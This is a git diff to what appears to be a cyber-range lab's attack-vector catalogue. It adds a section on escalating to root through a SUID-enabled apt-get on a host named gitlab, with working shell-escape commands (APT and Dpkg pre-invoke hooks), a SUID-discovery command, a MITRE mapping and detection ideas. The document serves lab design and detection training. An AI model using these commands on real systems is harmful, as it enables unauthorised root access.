@@ -168,6 +168,45 @@ SSH as secondary_user06 (no sudo)
 
 ---
 
+### SUID apt-get — Shell Escape to Root (gitlab)
+
+| Field | Detail |
+|---|---|
+| **Host** | gitlab (10.2.50.15) |
+| **Entry point** | `secondary_user06` (SSH, no sudo) |
+| **Condition** | `/usr/bin/apt-get` has SUID root bit set |
+| **Primitive** | apt-get pre-invoke hook executes an arbitrary command as root before the package operation runs |
+| **GTFOBins** | [apt-get — SUID](https://gtfobins.github.io/gtfobins/apt-get/#suid) |
+| **MITRE ATT&CK** | [T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid](https://attack.mitre.org/techniques/T1548/001/) |
+
+**Exploit:**
+
+```bash
+# Method 1 — Pre-Invoke option (shell exits, then update runs)
+apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+
+# Method 2 — Dpkg pre-invoke config (package must not be installed)
+echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > /tmp/x
+apt-get -y install -c /tmp/x sl
+```
+
+**Attack path:**
+
+```
+SSH as secondary_user06 (no sudo)
+  → Discover SUID binaries: find / -perm -4000 -type f 2>/dev/null
+  → Identify /usr/bin/apt-get with SUID root
+  → apt-get update -o APT::Update::Pre-Invoke::=/bin/sh → root shell (T1548.001)
+```
+
+**Detection opportunities:**
+
+- `apt-get` process spawned by non-root user with effective UID 0
+- `/bin/sh` child of `apt-get` outside expected maintenance window
+- `-o APT::Update::Pre-Invoke` or `Dpkg::Pre-Invoke` in process arguments (Sysmon/auditd)
+
+---
+
 ## By Technology
 
 | Technology | Vectors |
@@ -176,7 +215,7 @@ SSH as secondary_user06 (no sudo)
 | ADCS | ESC1–ESC16 certificate template misconfigurations, RDP access to CA |
 | IIS + ASP.NET + MSSQL | Web application attacks, SQL injection, authentication bypass |
 | GitLab CE | Source code exposure, CI/CD pipeline abuse, secret leakage, SUID privesc |
-| Linux (gitlab, ops) | SUID binary abuse |
+| Linux (gitlab, ops) | SUID binary abuse (R, apt-get) |
 | Elastic SIEM | Detection engineering, alert tuning, log analysis |
 
 ## Notes
